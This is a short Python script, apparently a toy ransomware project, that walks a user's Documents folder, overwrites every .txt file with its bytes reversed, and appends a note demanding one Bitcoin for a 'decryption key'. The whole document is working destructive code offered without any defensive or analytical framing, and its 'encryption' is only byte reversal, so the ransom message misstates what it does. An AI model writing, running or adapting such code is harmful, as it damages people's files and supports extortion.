import os

# Define the directory to encrypt
target_directory = "C:/Users/91821/Documents/GitHub/python-my-projects"

# Define the file extension to encrypt
file_extension = ".txt"

# Define the ransom message
ransom_message = "Your files have been encrypted! Send 1 Bitcoin to 123ABC to get the decryption key."

# Encrypt the files in the target directory
for root, dirs, files in os.walk(target_directory):
    for file in files:
        if file.endswith(file_extension):
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as f:
                data = f.read()
            with open(file_path, "wb") as f:
                f.write(data[::-1])
            with open(file_path, "a") as f:
                f.write(ransom_message)
